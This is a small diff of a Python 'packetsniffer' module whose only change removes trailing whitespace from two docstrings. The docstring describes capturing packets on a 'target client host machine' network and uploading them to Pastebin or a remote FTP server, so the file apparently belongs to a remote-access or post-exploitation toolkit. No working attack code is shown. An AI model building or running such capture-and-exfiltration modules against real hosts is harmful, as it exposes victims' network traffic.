@@ -24,7 +24,7 @@ results = {}
 log = StringIO.StringIO()
 flag = threading.Event()
 usage  = 'packetsniffer [mode]'
-desription = """ 
+desription = """
 Capture packets on the target client host machine's local network
 and optionally upload them to Pastebin or to a remote FTP server
 """
@@ -169,7 +169,7 @@ def _run():
 
 
 def run():
-    """ 
+    """
     Monitor the host network and capture packets
 
     `Optional`
